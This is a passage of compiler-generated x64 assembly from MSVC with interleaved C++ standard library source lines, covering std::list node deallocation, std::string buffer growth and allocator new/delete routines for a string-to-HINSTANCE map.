; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN55@Free_non_h

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN52@Free_non_h

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN55@Free_non_h:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN41@Free_non_h:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], sil
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 327  :         for (_Nodeptr _Pnext; _Pnode; _Pnode = _Pnext) {

	mov	rbx, rdi
	test	rdi, rdi
	jne	SHORT $LL4@Free_non_h
	mov	rdi, QWORD PTR [rsp+48]
$LN113@Free_non_h:

; 331  :     }

	mov	rbx, QWORD PTR [rsp+64]
	add	rsp, 32					; 00000020H
	pop	rsi
	ret	0
$LN52@Free_non_h:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN121@Free_non_h:
??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ENDP ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??$_Freenode0@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
_TEXT	SEGMENT
_Al$dead$ = 8
_Ptr$ = 16
??$_Freenode0@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z PROC ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Freenode0<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >, COMDAT

; 307  :     static void _Freenode0(_Alnode& _Al, _Nodeptr _Ptr) noexcept {

	mov	rcx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	edx, 56					; 00000038H
	jmp	??3@YAXPEAX_K@Z				; operator delete
??$_Freenode0@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ENDP ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Freenode0<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEAV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEAV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEAV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0U_Zero_then_variadic_args_t@std@@M@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAU21@$$QEAM@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
<_Val2_0>$dead$ = 24
<_Val2_1>$ = 32
??$?0U_Zero_then_variadic_args_t@std@@M@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAU21@$$QEAM@Z PROC ; std::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1>::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1><std::_Zero_then_variadic_args_t,float>, COMDAT

; 1496 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	mov	eax, DWORD PTR [r9]
	mov	DWORD PTR [rcx], eax
	mov	rax, rcx
	ret	0
??$?0U_Zero_then_variadic_args_t@std@@M@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAU21@$$QEAM@Z ENDP ; std::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1>::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1><std::_Zero_then_variadic_args_t,float>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z
_TEXT	SEGMENT
this$ = 80
_Size_increase$dead$ = 88
_Fn$dead$ = 96
<_Args_0>$ = 104
??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<`std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>,char>, COMDAT

; 4809 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

$LN134:
	push	rbx
	push	rsi
	push	r14
	push	r15
	sub	rsp, 40					; 00000028H

; 4810 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4811 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4812 :         auto& _My_data            = _Mypair._Myval2;
; 4813 :         const size_type _Old_size = _My_data._Mysize;

	mov	r14, QWORD PTR [rcx+16]

; 4814 :         if (max_size() - _Old_size < _Size_increase) {

	mov	rbx, 9223372036854775807		; 7fffffffffffffffH
	mov	rax, rbx
	movzx	r15d, r9b
	sub	rax, r14
	mov	rsi, rcx
	cmp	rax, 1
	jb	$LN131@Reallocate

; 4816 :         }
; 4817 : 
; 4818 :         const size_type _New_size     = _Old_size + _Size_increase;
; 4819 :         const size_type _Old_capacity = _My_data._Myres;

	mov	QWORD PTR [rsp+88], rbp
	mov	rbp, QWORD PTR [rcx+24]
	mov	QWORD PTR [rsp+96], rdi
	mov	QWORD PTR [rsp+32], r12
	lea	r12, QWORD PTR [r14+1]

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	mov	rdx, r12
	or	rdx, 15
	cmp	rdx, rbx

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	ja	SHORT $LN129@Reallocate

; 4765 :             return _Max;
; 4766 :         }
; 4767 : 
; 4768 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

	mov	rcx, rbp
	mov	rax, rbx
	shr	rcx, 1
	sub	rax, rcx
	cmp	rbp, rax
	ja	SHORT $LN129@Reallocate

; 4769 :             return _Max;
; 4770 :         }
; 4771 : 
; 4772 :         return (_STD max)(_Masked, _Old + _Old / 2);

	lea	rax, QWORD PTR [rcx+rbp]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	mov	rbx, rdx
	cmp	rdx, rax
	cmovb	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	lea	rcx, QWORD PTR [rbx+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	jne	SHORT $LN28@Reallocate

; 197  :         return nullptr;

	xor	edi, edi
	jmp	SHORT $LN27@Reallocate
$LN28@Reallocate:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN30@Reallocate

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	$LN132@Reallocate
	jmp	SHORT $LN41@Reallocate
$LN129@Reallocate:

; 101  :         return ::operator new(_Bytes);

	mov	rax, -9223372036854775808		; 8000000000000000H
	add	rax, 39					; 00000027H
$LN41@Reallocate:
	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN82@Reallocate

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	lea	rdi, QWORD PTR [rax+39]
	and	rdi, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rdi-8], rax

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN27@Reallocate
$LN30@Reallocate:

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	rdi, rax
$LN27@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4826 :         _My_data._Mysize      = _New_size;

	mov	QWORD PTR [rsi+16], r12

; 4827 :         _My_data._Myres       = _New_capacity;
; 4828 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);
; 4829 :         if (_Old_capacity > _Small_string_capacity) {

	mov	r8, r14
	mov	QWORD PTR [rsi+24], rbx
	mov	rcx, rdi
	cmp	rbp, 15
	jbe	SHORT $LN3@Reallocate

; 4830 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

	mov	rbx, QWORD PTR [rsi]

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rdx, rbx
	call	memcpy

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	lea	rdx, QWORD PTR [rbp+1]

; 4102 :                     _Traits::assign(_New_ptr[_Old_size], _Ch);

	mov	BYTE PTR [r14+rdi], r15b

; 4103 :                     _Traits::assign(_New_ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR [r14+rdi+1], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN85@Reallocate

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rbx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rbx, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rbx-8]
	cmp	rax, 31
	ja	SHORT $LN82@Reallocate

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rbx, rcx
$LN85@Reallocate:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4834 :         } else {

	jmp	SHORT $LN4@Reallocate
$LN3@Reallocate:

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rdx, rsi
	call	memcpy

; 4102 :                     _Traits::assign(_New_ptr[_Old_size], _Ch);

	mov	BYTE PTR [r14+rdi], r15b

; 4103 :                     _Traits::assign(_New_ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR [r14+rdi+1], 0
$LN4@Reallocate:

; 4835 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);
; 4836 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);
; 4837 :         }
; 4838 : 
; 4839 :         _ASAN_STRING_CREATE(*this);
; 4840 :         return *this;

	mov	QWORD PTR [rsi], rdi
	mov	rax, rsi
	mov	rdi, QWORD PTR [rsp+96]
	mov	rbp, QWORD PTR [rsp+88]
	mov	r12, QWORD PTR [rsp+32]

; 4841 :     }

	add	rsp, 40					; 00000028H
	pop	r15
	pop	r14
	pop	rsi
	pop	rbx
	ret	0
$LN82@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN132@Reallocate:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN131@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4815 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
	int	3
$LN128@Reallocate:
??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<`std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z
_TEXT	SEGMENT
_Obj$ = 8
<_Args_0>$ = 16
??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z PROC ; std::_Construct_in_place<char *,char * &>, COMDAT

; 382  : #if _HAS_CXX20
; 383  :     if (_STD is_constant_evaluated()) {
; 384  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 385  :     } else
; 386  : #endif // _HAS_CXX20
; 387  :     {
; 388  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);
; 389  :     }
; 390  : }

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	ret	0
??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z ENDP ; std::_Construct_in_place<char *,char * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Get_unwrapped@AEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA?A_TAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@@Z
_TEXT	SEGMENT
_It$ = 8
??$_Get_unwrapped@AEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA?A_TAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@@Z PROC ; std::_Get_unwrapped<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > * const &>, COMDAT

; 1305 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1306 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1307 :         return _It + 0;

	mov	rax, QWORD PTR [rcx]

; 1308 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1309 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1310 :     } else {
; 1311 :         return static_cast<_Iter&&>(_It);
; 1312 :     }
; 1313 : }

	ret	0
??$_Get_unwrapped@AEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA?A_TAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@@Z ENDP ; std::_Get_unwrapped<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$uninitialized_fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
_Val$ = 24
??$uninitialized_fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z PROC ; std::uninitialized_fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >, COMDAT

; 1583 :     constexpr explicit _Uninitialized_backout(_NoThrowFwdIt _Dest) : _First(_Dest), _Last(_Dest) {}

